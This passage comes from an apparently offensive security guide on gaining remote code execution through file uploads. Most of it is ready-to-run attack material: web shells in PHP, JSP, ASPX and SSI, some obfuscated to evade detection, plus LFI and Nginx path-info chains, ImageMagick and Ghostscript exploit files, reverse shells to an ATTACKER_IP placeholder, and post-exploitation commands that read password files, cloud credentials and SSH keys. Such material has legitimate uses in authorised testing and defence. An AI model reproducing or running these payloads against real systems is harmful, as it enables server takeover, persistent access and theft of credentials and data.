  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > avatar.gif
  curl -X POST https://target.com/api/avatar \
    -F "file=@avatar.gif;type=image/gif" -b "session=COOKIE"
  # Uploaded to: /uploads/avatars/avatar.gif

  # Step 2: Include via LFI with various traversal depths
  for depth in 1 2 3 4 5; do
    TRAVERSE=$(printf '../%.0s' $(seq 1 $depth))
    URL="https://target.com/index.php?page=${TRAVERSE}uploads/avatars/avatar.gif"
    RESULT=$(curl -s "$URL" 2>/dev/null)
    if echo "$RESULT" | grep -q "GIF89a"; then
      echo "[+] LFI works at depth $depth"
      # Now add command
      curl -s "${URL}&cmd=id" | grep "uid="
      if [ $? -eq 0 ]; then
        echo "[!!!] RCE via LFI+Upload at depth $depth!"
        echo "Full URL: ${URL}&cmd=id"
        break
      fi
    fi
  done

  # Step 3: Try filter bypass variations
  LFI_PAYLOADS=(
    "../uploads/avatars/avatar.gif"
    "../../uploads/avatars/avatar.gif"
    "../../../uploads/avatars/avatar.gif"
    "....//uploads/avatars/avatar.gif"
    "....//....//uploads/avatars/avatar.gif"
    "..%2f..%2fuploads/avatars/avatar.gif"
    "..%252f..%252fuploads/avatars/avatar.gif"
    "%2e%2e%2fuploads/avatars/avatar.gif"
    "..%c0%afuploads/avatars/avatar.gif"
    "..%ef%bc%8fuploads/avatars/avatar.gif"
    "....\\\\uploads/avatars/avatar.gif"
    "../uploads/avatars/avatar.gif%00"
    "../uploads/avatars/avatar.gif%00.php"
    "php://filter/resource=../uploads/avatars/avatar.gif"
  )

  for payload in "${LFI_PAYLOADS[@]}"; do
    # Try common LFI parameter names
    for param in page file include template path view lang; do
      RESULT=$(curl -s "https://target.com/index.php?${param}=${payload}&cmd=id" 2>/dev/null)
      if echo "$RESULT" | grep -q "uid="; then
        echo "[!!!] RCE: param=$param payload=$payload"
      fi
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nginx Path Info + Upload = RCE"}
  ```bash
  # ═══════════════════════════════════════════
  #  Nginx + PHP-FPM with cgi.fix_pathinfo=1
  #  Any file can execute as PHP by appending /x.php to its URL
  # ═══════════════════════════════════════════

  # Step 1: Detect vulnerability (no upload needed)
  # Find any existing image on the target
  IMAGES=$(curl -s https://target.com | grep -oP 'src="(/[^"]*\.(jpg|png|gif|svg|ico))"' | grep -oP '/[^"]*' | head -10)

  echo "Testing Nginx path info vulnerability..."
  for img in $IMAGES; do
    for suffix in "/x.php" "/.php" "/test.php" "/a.php"; do
      STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com${img}${suffix}" 2>/dev/null)
      if [ "$STATUS" != "404" ] && [ "$STATUS" != "400" ] && [ "$STATUS" != "000" ]; then
        echo "[!] ${img}${suffix} → HTTP $STATUS (POTENTIALLY VULNERABLE)"
      fi
    done
  done

  # Step 2: Upload image with embedded PHP
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > photo.gif
  curl -X POST https://target.com/upload \
    -F "file=@photo.gif;type=image/gif" -b "session=COOKIE"

  # Step 3: Execute via path info trick
  curl "https://target.com/uploads/photo.gif/x.php?cmd=id"
  curl "https://target.com/uploads/photo.gif/.php?cmd=id"
  curl "https://target.com/uploads/photo.gif/anything.php?cmd=id"

  # Step 4: If specific filename unknown, try uploaded file URL
  # (extracted from upload response in step 2)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SSI + Upload = RCE"}
  ```bash
  # ═══════════════════════════════════════════
  #  Server Side Includes — if SSI is enabled
  #  Common on Apache with mod_include
  # ═══════════════════════════════════════════

  # Method 1: Upload .shtml file directly
  echo '<!--#exec cmd="id" -->' > shell.shtml
  curl -X POST https://target.com/upload \
    -F "file=@shell.shtml;type=text/html" -b "session=COOKIE"
  curl "https://target.com/uploads/shell.shtml"

  # Method 2: SSI in .stm extension
  echo '<!--#exec cmd="id" -->' > shell.stm
  curl -X POST https://target.com/upload \
    -F "file=@shell.stm;type=text/html" -b "session=COOKIE"

  # Method 3: Dynamic command via query string
  cat > ssi_dynamic.shtml << 'EOF'
  <!--#set var="cmd" value="$QUERY_STRING" -->
  <!--#exec cmd="$cmd" -->
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@ssi_dynamic.shtml;type=text/html" -b "session=COOKIE"
  curl "https://target.com/uploads/ssi_dynamic.shtml?id"
  curl "https://target.com/uploads/ssi_dynamic.shtml?cat+/etc/passwd"

  # Method 4: SSI via .htaccess (if .shtml not allowed)
  cat > .htaccess << 'EOF'
  Options +Includes
  AddType text/html .jpg
  AddOutputFilter INCLUDES .jpg
  EOF
  # Upload .htaccess, then upload SSI commands in .jpg
  echo '<!--#exec cmd="id" -->' > ssi_shell.jpg
  curl -X POST https://target.com/upload \
    -F "file=@ssi_shell.jpg;type=image/jpeg" -b "session=COOKIE"
  curl "https://target.com/uploads/ssi_shell.jpg"

  # SSI include another file
  echo '<!--#include virtual="/etc/passwd" -->' > ssi_include.shtml

  # SSI environment variable dump
  echo '<!--#printenv -->' > ssi_env.shtml

  # SSI conditional execution
  cat > ssi_cond.shtml << 'EOF'
  <!--#if expr="$QUERY_STRING" -->
  <!--#exec cmd="$QUERY_STRING" -->
  <!--#else -->
  <p>Provide a command as query string</p>
  <!--#endif -->
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ImageMagick / Ghostscript RCE"}
  ```bash
  # ═══════════════════════════════════════════
  #  ImageTragick (CVE-2016-3714) — ImageMagick < 6.9.3-10
  #  Triggered when server processes uploaded images
  # ═══════════════════════════════════════════

  # === MVG format — command injection via URL handler ===
  cat > exploit.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.1/x.jpg"|id > /tmp/im_pwned")'
  pop graphic-context
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@exploit.mvg;type=image/jpeg;filename=photo.jpg" -b "session=COOKIE"

  # === SVG format trigger ===
  cat > exploit.svg << 'EOF'
  <?xml version="1.0" standalone="no"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg width="640px" height="480px">
  <image xlink:href="https://127.0.0.1/x.jpg&quot;|id > /tmp/im_pwned&quot;" x="0" y="0" height="640px" width="480px"/>
  </svg>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@exploit.svg;type=image/svg+xml" -b "session=COOKIE"

  # === Ephemeral protocol ===
  cat > exploit_eph.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral://|id > /tmp/im_pwned'
  pop graphic-context
  EOF

  # === MSL (ImageMagick Scripting Language) ===
  cat > exploit.msl << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <image>
  <read filename="ephemeral://|id > /tmp/im_pwned"/>
  </image>
  EOF

  # === Reverse shell via ImageMagick ===
  cat > revshell_im.mvg << 'EOF'
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://127.0.0.1/x"|bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"")'
  pop graphic-context
  EOF

  # === Callback-based detection (does server process images?) ===
  cat > detect_im.svg << 'EOF'
  <?xml version="1.0" standalone="no"?>
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://ATTACKER_IP:8888/imagemagick_callback" width="100" height="100"/>
  </svg>
  EOF
  # Start listener, upload file, check for incoming request
  python3 -m http.server 8888 &
  curl -X POST https://target.com/upload \
    -F "file=@detect_im.svg;type=image/svg+xml" -b "session=COOKIE"
  # If you receive HTTP request → server processes SVG with IM → exploitable

  # ═══════════════════════════════════════════
  #  Ghostscript RCE (CVE-2023-36664)
  #  Ghostscript < 10.01.2
  # ═══════════════════════════════════════════
  cat > exploit.eps << 'EOF'
  %!PS-Adobe-3.0 EPSF-3.0
  %%BoundingBox: 0 0 100 100
  userdict /setpagedevice undef
  save
  legal
  { null restore } stopped { pop } if
  { legal } stopped { pop } if
  restore
  mark /OutputFile (%pipe%id > /tmp/gs_rce) currentdevice putdeviceprops
  EOF

  curl -X POST https://target.com/upload \
    -F "file=@exploit.eps;type=application/postscript" -b "session=COOKIE"
  ```
  :::
::

---

## Reverse Shell Deployment

::note
Reverse shells provide interactive access — the target connects back to your listener. This is the strongest proof of impact for bug bounty reports. Upload a trigger script, start your listener, then request the trigger URL.
::

::code-group
```bash [PHP Reverse Shells]
# === Method 1: fsockopen + proc_open ===
cat > rev1.php << 'EOF'
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/bash', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
EOF

# === Method 2: Bash via system() ===
cat > rev2.php << 'EOF'
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
EOF

# === Method 3: Python via PHP ===
cat > rev3.php << 'EOF'
<?php
system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'");
?>
EOF

# === Method 4: Perl via PHP ===
cat > rev4.php << 'EOF'
<?php system("perl -e 'use Socket;\$i=\"ATTACKER_IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"); ?>
EOF

# === Method 5: Netcat ===
cat > rev5.php << 'EOF'
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"); ?>
EOF

# === Method 6: PHP native socket (no system() needed) ===
cat > rev6.php << 'EOF'
<?php
$ip = "ATTACKER_IP";
$port = 4444;
$sock = fsockopen($ip, $port);
while ($cmd = fgets($sock)) {
  $cmd = trim($cmd);
  if ($cmd == "exit") break;
  $output = shell_exec($cmd . " 2>&1");
  fwrite($sock, $output . "\n$ ");
}
fclose($sock);
?>
EOF

# Start listener (on your machine)
nc -lvnp 4444
# or
rlwrap nc -lvnp 4444
# or
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Upload and trigger
curl -X POST https://target.com/upload \
  -F "file=@rev2.php;type=image/jpeg" -b "session=COOKIE"
curl "https://target.com/uploads/rev2.php"

# Try different ports if 4444 is blocked
for port in 4444 443 80 53 8080 8443 1337 9001; do
  sed "s/4444/$port/" rev2.php > rev_port_$port.php
  echo "Testing port $port..."
done
```

```bash [JSP Reverse Shell]
cat > revshell.jsp << 'JSPEOF'
<%@ page import="java.io.*,java.net.*" %>
<%
String host = "ATTACKER_IP";
int port = 4444;
try {
  Socket s = new Socket(host, port);
  Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
  InputStream pi = p.getInputStream();
  OutputStream po = p.getOutputStream();
  InputStream si = s.getInputStream();
  OutputStream so = s.getOutputStream();
  while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (si.available() > 0) po.write(si.read());
    so.flush(); po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e) {}
  }
  p.destroy(); s.close();
} catch (Exception e) {}
%>
JSPEOF

nc -lvnp 4444
curl "https://target.com/uploads/revshell.jsp"
```

```bash [ASPX Reverse Shell (PowerShell)]
cat > revshell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "powershell.exe";
p.StartInfo.Arguments = @"-NoP -NonI -W Hidden -Exec Bypass -Command ""$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()""";
p.StartInfo.UseShellExecute = false;
p.Start();
%>
EOF

nc -lvnp 4444
curl "https://target.com/uploads/revshell.aspx"
```

```bash [Python CGI Reverse Shell]
cat > revshell.py << 'EOF'
#!/usr/bin/env python3
import socket,subprocess,os
print("Content-Type: text/html\n")
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
chmod +x revshell.py

nc -lvnp 4444
curl "https://target.com/cgi-bin/revshell.py"
```
::

---

## Post-Exploitation Enumeration

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux System Enumeration"}
  ```bash
  SHELL="https://target.com/uploads/shell.php"

  # ═══ System Identity ═══
  curl "$SHELL?cmd=id"
  curl "$SHELL?cmd=whoami"
  curl "$SHELL?cmd=hostname"
  curl "$SHELL?cmd=uname+-a"
  curl "$SHELL?cmd=cat+/etc/os-release"
  curl "$SHELL?cmd=cat+/proc/version"

  # ═══ Network Configuration ═══
  curl "$SHELL?cmd=ifconfig" || curl "$SHELL?cmd=ip+addr+show"
  curl "$SHELL?cmd=ip+route"
  curl "$SHELL?cmd=cat+/etc/resolv.conf"
  curl "$SHELL?cmd=cat+/etc/hosts"
  curl "$SHELL?cmd=netstat+-tlnp" || curl "$SHELL?cmd=ss+-tlnp"
  curl "$SHELL?cmd=arp+-a"

  # ═══ User & Access Information ═══
  curl "$SHELL?cmd=cat+/etc/passwd"
  curl "$SHELL?cmd=cat+/etc/shadow"     # Requires root
  curl "$SHELL?cmd=cat+/etc/group"
  curl "$SHELL?cmd=w"
  curl "$SHELL?cmd=last+-20"
  curl "$SHELL?cmd=sudo+-l"             # Check sudo permissions

  # ═══ Process & Service Info ═══
  curl "$SHELL?cmd=ps+aux"
  curl "$SHELL?cmd=ps+aux+|+grep+-E+'(mysql|postgres|mongo|redis|elastic|apache|nginx|node|java|tomcat)'"
  curl "$SHELL?cmd=systemctl+list-units+--type=service+--state=running"

  # ═══ Application Secrets & Credentials ═══
  curl "$SHELL?cmd=cat+/var/www/html/.env"
  curl "$SHELL?cmd=cat+/var/www/html/config.php"
  curl "$SHELL?cmd=cat+/var/www/html/wp-config.php"
  curl "$SHELL?cmd=cat+/var/www/html/configuration.php"
  curl "$SHELL?cmd=cat+/var/www/html/config/database.yml"
  curl "$SHELL?cmd=cat+/var/www/html/settings.py"
  curl "$SHELL?cmd=env"
  curl "$SHELL?cmd=cat+/proc/self/environ"
  curl "$SHELL?cmd=find+/var/www+-name+'*.env'+-o+-name+'*config*'+-o+-name+'*secret*'+-o+-name+'*credential*'+2>/dev/null+|+head+-30"

  # ═══ Cloud Credentials ═══
  curl "$SHELL?cmd=cat+/home/*/.aws/credentials+2>/dev/null"
  curl "$SHELL?cmd=cat+/root/.aws/credentials+2>/dev/null"
  curl "$SHELL?cmd=cat+/home/*/.azure/accessTokens.json+2>/dev/null"
  curl "$SHELL?cmd=cat+/home/*/.config/gcloud/credentials.db+2>/dev/null"
  curl "$SHELL?cmd=curl+-s+http://169.254.169.254/latest/meta-data/iam/security-credentials/"

  # ═══ SSH Keys ═══
  curl "$SHELL?cmd=find+/home+-name+'id_rsa'+-o+-name+'id_ed25519'+-o+-name+'id_ecdsa'+2>/dev/null"
  curl "$SHELL?cmd=cat+/root/.ssh/id_rsa+2>/dev/null"
  curl "$SHELL?cmd=cat+/root/.ssh/authorized_keys+2>/dev/null"

  # ═══ Database Connections ═══
  curl "$SHELL?cmd=mysql+-u+root+-e+'show+databases;'+2>/dev/null"
  curl "$SHELL?cmd=psql+-l+2>/dev/null"
  curl "$SHELL?cmd=mongo+--eval+'db.adminCommand({listDatabases:1})'+2>/dev/null"
  curl "$SHELL?cmd=redis-cli+info+2>/dev/null"

  # ═══ File System Exploration ═══
  curl "$SHELL?cmd=df+-h"
  curl "$SHELL?cmd=mount"
  curl "$SHELL?cmd=find+/+-perm+-4000+-type+f+2>/dev/null"  # SUID binaries
  curl "$SHELL?cmd=find+/+-writable+-type+f+2>/dev/null+|+head+-20"  # Writable files
  curl "$SHELL?cmd=cat+/etc/crontab"
  curl "$SHELL?cmd=ls+-la+/etc/cron.d/"
  curl "$SHELL?cmd=crontab+-l+2>/dev/null"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Windows System Enumeration"}
  ```bash
  SHELL="https://target.com/uploads/shell.aspx"

  # ═══ System Identity ═══
  curl "$SHELL?cmd=whoami"
  curl "$SHELL?cmd=whoami+/priv"
  curl "$SHELL?cmd=whoami+/groups"
  curl "$SHELL?cmd=hostname"
  curl "$SHELL?cmd=systeminfo"

  # ═══ Network Configuration ═══
  curl "$SHELL?cmd=ipconfig+/all"
  curl "$SHELL?cmd=netstat+-ano"
  curl "$SHELL?cmd=arp+-a"
  curl "$SHELL?cmd=route+print"
  curl "$SHELL?cmd=netsh+firewall+show+config"

  # ═══ User & Access Information ═══
  curl "$SHELL?cmd=net+user"
  curl "$SHELL?cmd=net+localgroup+administrators"
  curl "$SHELL?cmd=net+user+administrator"
  curl "$SHELL?cmd=cmdkey+/list"

  # ═══ Process & Service Info ═══
  curl "$SHELL?cmd=tasklist+/v"
  curl "$SHELL?cmd=sc+query"
  curl "$SHELL?cmd=schtasks+/query+/fo+LIST"

  # ═══ File System & Secrets ═══
  curl "$SHELL?cmd=dir+c:\\"
  curl "$SHELL?cmd=dir+c:\\inetpub\\wwwroot"
  curl "$SHELL?cmd=type+c:\\inetpub\\wwwroot\\web.config"
  curl "$SHELL?cmd=type+c:\\windows\\system32\\drivers\\etc\\hosts"
  curl "$SHELL?cmd=reg+query+HKLM+/f+password+/t+REG_SZ+/s"

  # ═══ PowerShell Commands ═══
  curl "$SHELL?cmd=powershell+-c+Get-Process"
  curl "$SHELL?cmd=powershell+-c+Get-Service"
  curl "$SHELL?cmd=powershell+-c+Get-ChildItem+Env:"
  curl "$SHELL?cmd=powershell+-c+[System.Environment]::OSVersion"
  ```
  :::
::

---

## Execution Verification Steps

::steps{level="4"}

#### Locate the Uploaded File

```bash
# Check upload response for file path
RESPONSE=$(curl -s -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" -b "session=COOKIE")
echo "$RESPONSE" | python3 -c "import sys,json;print(json.dumps(json.load(sys.stdin),indent=2))" 2>/dev/null \
  || echo "$RESPONSE" | grep -oiE '"(url|path|src|href|file)":\s*"[^"]*"'

# Brute-force common directories
for dir in uploads files media images static content assets data documents \
           avatars user_uploads public/uploads storage/uploads \
           wp-content/uploads fileadmin media/uploads resources tmp; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$dir/shell.php" 2>/dev/null)
  [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && echo "  [FOUND] /$dir/shell.php → HTTP $STATUS"
done
```

#### Analyze Serving Headers

```bash
curl -sI "https://target.com/uploads/shell.php" | head -15

# Content-Type: text/html             → PHP IS executing (outputs HTML)
# Content-Type: application/x-httpd-php → Handler matched (may execute)
# Content-Type: text/plain            → NOT executing (raw text shown)
# Content-Type: application/octet-stream → NOT executing (download)
# Content-Disposition: attachment      → NOT executing (forced download)

# Check if raw PHP is visible (NOT executing)
BODY=$(curl -s "https://target.com/uploads/shell.php" | head -3)
if echo "$BODY" | grep -q "<?php"; then
  echo "[!] Raw PHP visible — server is NOT executing"
else
  echo "[+] PHP tags not visible — server MAY be executing"
fi
```

#### Confirm Execution with Safe PoC

```bash
# Upload hash-based PoC (safe, non-destructive)
echo '<?php echo md5("rce_confirmed_" . php_uname()); ?>' > verify.php
curl -X POST https://target.com/upload \
  -F "file=@verify.php;type=image/jpeg" -b "session=COOKIE"

RESULT=$(curl -s "https://target.com/uploads/verify.php")
if echo "$RESULT" | grep -qP '^[a-f0-9]{32}$'; then
  echo "[!!!] RCE CONFIRMED — Server executed PHP and returned hash: $RESULT"
else
  echo "[-] Execution not confirmed. Try alternative extensions or chains."
fi
```

#### Test Command Execution Functions

```bash
# Try different execution functions (some may be disabled)
for func in system shell_exec passthru exec popen; do
  echo "<?php echo ${func}('echo FUNC_${func}_OK'); ?>" > "test_${func}.php"
  curl -X POST https://target.com/upload \
    -F "file=@test_${func}.php;type=image/jpeg" -b "session=COOKIE" > /dev/null 2>&1
  RESULT=$(curl -s "https://target.com/uploads/test_${func}.php")
  echo "$func → $(echo "$RESULT" | grep -o "FUNC_${func}_OK" || echo "BLOCKED")"
  rm -f "test_${func}.php"
done
```

#### Demonstrate Impact

```bash
# For bug bounty — demonstrate reading sensitive data
curl "https://target.com/uploads/shell.php?cmd=id"
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/hostname"
# Screenshot the output as proof
# DO NOT escalate further without explicit scope authorization
```

::

---

## Troubleshooting Failed Execution

::collapsible
**Diagnosis Matrix — Upload Succeeds But Execution Fails**

| Symptom | Likely Cause | Bypass Technique |
| --- | --- | --- |
| Raw PHP source code displayed | PHP handler not mapped for the extension | Upload `.htaccess` with `AddType`, use `.phtml`/`.php5`/`.phar`, double extension |
| `403 Forbidden` when accessing file | Directory execution disabled (`Options -ExecCGI`) | Upload `.htaccess` with `Options +ExecCGI`, path traversal to write outside uploads |
| `404 Not Found` after successful upload | File renamed or stored outside web root | Check response for new filename, try UUID/timestamp/hash patterns |
| File downloads instead of executing | `Content-Disposition: attachment` header set | Chain with LFI instead of direct access |
| `500 Internal Server Error` | Syntax error in shell or disabled function called | Upload `<?php phpinfo(); ?>` first, check error logs |
| Blank/empty response | Function runs but output not captured | Use `echo shell_exec()` instead of `system()`, or `passthru()` |
| `<?php ... ?>` literal in response body | Wrong PHP tag format or PHP disabled entirely | Use `<?php` not `<?`, check if PHP is installed |
| `open_basedir restriction` error | PHP restricted to specific directories | Read allowed paths from phpinfo(), stay within them |
| Reverse shell timeout | Outbound connections blocked by firewall | Try ports 80/443/53, use DNS exfiltration, or use bind shell |
| Obfuscated shell blocked | WAF detected behavioral pattern | Use deeper obfuscation, eval-based with POST parameters, or encoding layers |
::

::code-collapse
```bash [Comprehensive Execution Diagnostic Script]
#!/bin/bash
# ╔═════════════════════════════════════════════╗
# ║  Execution Diagnostic — Identify Why        ║
# ║  Upload Succeeds But Execution Fails         ║
# ╚═════════════════════════════════════════════╝

TARGET="${1:?Usage: $0 <upload_url> <cookie> <uploaded_file_url>}"
COOKIE="${2:?Provide session cookie}"
FILE_URL="${3:?Provide URL of uploaded file}"

echo "═══════════════════════════════════════"
echo " Execution Diagnostic"
echo " File URL: $FILE_URL"
echo "═══════════════════════════════════════"

echo ""
echo "[1] Does the file exist?"
STATUS=$(curl -so /dev/null -w "%{http_code}" "$FILE_URL" 2>/dev/null)
echo "    HTTP Status: $STATUS"

echo ""
echo "[2] What Content-Type is served?"
CT=$(curl -sI "$FILE_URL" 2>/dev/null | grep -i "^content-type:" | tr -d '\r')
echo "    $CT"
CD=$(curl -sI "$FILE_URL" 2>/dev/null | grep -i "^content-disposition:" | tr -d '\r')
[ -n "$CD" ] && echo "    $CD"
XCT=$(curl -sI "$FILE_URL" 2>/dev/null | grep -i "^x-content-type" | tr -d '\r')
[ -n "$XCT" ] && echo "    $XCT"

echo ""
echo "[3] Is raw PHP code visible in response?"
BODY=$(curl -s "$FILE_URL" 2>/dev/null | head -10)
if echo "$BODY" | grep -q "<?php\|<?="; then
  echo "    YES — PHP is NOT executing (raw source shown)"
else
  echo "    NO — PHP tags not visible (may be executing or empty)"
fi

echo ""
echo "[4] Does phpinfo() work?"
echo '<?php phpinfo(); ?>' > /tmp/diag_phpinfo.php
curl -s -X POST "$TARGET" \
  -F "file=@/tmp/diag_phpinfo.php;type=image/jpeg" -b "$COOKIE" > /dev/null 2>&1

# Guess the URL based on file URL pattern
BASE_DIR=$(dirname "$FILE_URL")
PHPINFO_URL="$BASE_DIR/diag_phpinfo.php"
HITS=$(curl -s "$PHPINFO_URL" 2>/dev/null | grep -c "PHP Version")
echo "    phpinfo matches: $HITS (> 0 = executing)"

echo ""
echo "[5] Checking alternate extensions..."
for ext in php php5 phtml phar pht php7; do
  echo '<?php echo "EXT_'$ext'_OK"; ?>' > "/tmp/diag_ext.$ext"
  curl -s -X POST "$TARGET" \
    -F "file=@/tmp/diag_ext.$ext;type=image/jpeg" -b "$COOKIE" > /dev/null 2>&1
  RESULT=$(curl -s "$BASE_DIR/diag_ext.$ext" 2>/dev/null)
  if echo "$RESULT" | grep -q "EXT_${ext}_OK"; then
    echo "    [+] .$ext EXECUTES!"
  else
    echo "    [-] .$ext does not execute"
  fi
  rm -f "/tmp/diag_ext.$ext"
done

echo ""
echo "[6] Can .htaccess be uploaded?"
echo 'AddType application/x-httpd-php .jpg' > /tmp/diag_htaccess
curl -s -X POST "$TARGET" \
  -F "file=@/tmp/diag_htaccess;filename=.htaccess;type=text/plain" -b "$COOKIE" > /dev/null 2>&1
STATUS=$(curl -so /dev/null -w "%{http_code}" "$BASE_DIR/.htaccess" 2>/dev/null)
echo "    .htaccess accessible: HTTP $STATUS"

echo ""
echo "[7] Nginx path info test..."
STATUS=$(curl -so /dev/null -w "%{http_code}" "${FILE_URL}/test.php" 2>/dev/null)
echo "    ${FILE_URL}/test.php → HTTP $STATUS"
if [ "$STATUS" != "404" ] && [ "$STATUS" != "400" ]; then
  echo "    [!] Nginx path info may be vulnerable!"
fi

rm -f /tmp/diag_phpinfo.php /tmp/diag_htaccess
echo ""
echo "═══════════════════════════════════════"
echo " Diagnostic complete"
echo "═══════════════════════════════════════"
```
::

---

## Payload File Tree

::code-tree{default-value="php/minimal/system.php"}
```php [php/minimal/system.php]
<?php system($_GET['cmd']); ?>
```

```php [php/minimal/shell_exec.php]
<?php echo shell_exec($_GET['cmd']); ?>
```

```php [php/minimal/short_tag.php]
<?=`$_GET[cmd]`?>
```

```php [php/minimal/poc_hash.php]
<?php echo md5("rce_confirmed_" . php_uname()); ?>
```

```php [php/stealthy/post_shell.php]
<?php system($_POST['cmd']); ?>
```

```php [php/stealthy/header_shell.php]
<?php system($_SERVER['HTTP_X_CMD']); ?>
```

```php [php/stealthy/cookie_shell.php]
<?php system($_COOKIE['c']); ?>
```

```php [php/obfuscated/base64.php]
<?php $a=base64_decode('c3lzdGVt');$a($_GET['c']); ?>
```

```php [php/obfuscated/concat.php]
<?php $a='sys'.'tem';$a($_GET['cmd']); ?>
```

```php [php/obfuscated/rot13.php]
<?php $a=str_rot13('flfgrz');$a($_GET['cmd']); ?>
```

```php [php/obfuscated/var_func.php]
<?php $_GET['f']($_GET['c']); ?>
```

```php [php/obfuscated/eval_b64.php]
<?php eval(base64_decode($_POST['e'])); ?>
```

```php [php/obfuscated/chr_build.php]
<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET['cmd']); ?>
```

```asp [asp/eval.asp]
<% eval request("cmd") %>
```

```aspx [aspx/cmd.aspx]
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string c=Request["cmd"];if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());}%>
```

```jsp [jsp/processbuilder.jsp]
<%@ page import="java.util.*,java.io.*" %><%String c=request.getParameter("cmd");if(c!=null){ProcessBuilder pb=new ProcessBuilder("/bin/bash","-c",c);pb.redirectErrorStream(true);Process p=pb.start();java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");out.print(s.hasNext()?s.next():"");}%>
```

```text [config/.htaccess]
AddType application/x-httpd-php .jpg .png .gif
```

```text [config/.user.ini]
auto_prepend_file=shell.jpg
```

```xml [config/web.config]
<?xml version="1.0"?><configuration><system.webServer><handlers><add name="aspjpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers></system.webServer></configuration>
```

```text [config/ssi_shell.shtml]
<!--#exec cmd="id" -->
```
::

---

## Testing Methodology Checklist

1. **Fingerprint server technology** — identify PHP/ASP/JSP/Python before crafting any payload
2. **Upload smallest PoC first** — `<?php echo md5("test"); ?>` confirms execution with zero risk
3. **Locate the uploaded file** — extract URL from response, check common directories
4. **Analyze serving headers** — `Content-Type: text/html` = executing, `application/octet-stream` = not
5. **Check if raw PHP is visible** — if `<?php` appears in response body, server is NOT executing
6. **Try alternative PHP extensions** — `.php5`, `.phtml`, `.phar`, `.pht`, `.php7`
7. **Try double extensions** — `shell.php.jpg`, `shell.php.xyz`
8. **Upload `.htaccess`** — make image extensions executable as PHP
9. **Upload `.user.ini`** — auto-prepend shell to all PHP files in directory
10. **Chain with LFI** — include uploaded file via `?page=../../uploads/shell.gif`
11. **Test Nginx path info** — access `upload.gif/x.php`
12. **Test SSI execution** — upload `.shtml` with `<!--#exec cmd="id" -->`
13. **Check `disable_functions`** — upload diagnostic to list available functions
14. **Try obfuscated shells** — base64, rot13, concatenation, variable functions, eval-based
15. **Attempt `disable_functions` bypass** — LD_PRELOAD, FFI, imap_open, pcntl_exec
16. **Deploy reverse shell** — prove full interactive access
17. **Post-exploitation enumeration** — read configs, databases, cloud credentials, SSH keys
18. **Document everything** — screenshots, full reproduction steps, impact assessment